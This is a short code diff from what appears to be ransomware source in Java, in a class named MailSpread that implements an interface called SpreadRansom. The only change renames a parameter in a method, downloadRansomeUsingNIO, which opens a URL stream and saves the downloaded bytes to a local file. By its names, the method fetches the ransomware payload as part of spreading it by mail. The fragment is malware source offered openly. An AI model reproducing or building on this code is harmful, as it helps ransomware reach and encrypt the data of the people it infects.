@@ -146,10 +146,10 @@ public class MailSpread implements SpreadRansom {
 		}
 	}
 
-	private static void downloadRansomeUsingNIO(String urlStr) throws IOException {
+	private static void downloadRansomeUsingNIO(String urlstr) throws IOException {
 	
 		String file = "./";
-		URL url = new URL(urlStr);
+		URL url = new URL(urlstr);
 		ReadableByteChannel rbc = Channels.newChannel(url.openStream());
 		FileOutputStream fos = new FileOutputStream(file);
 		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
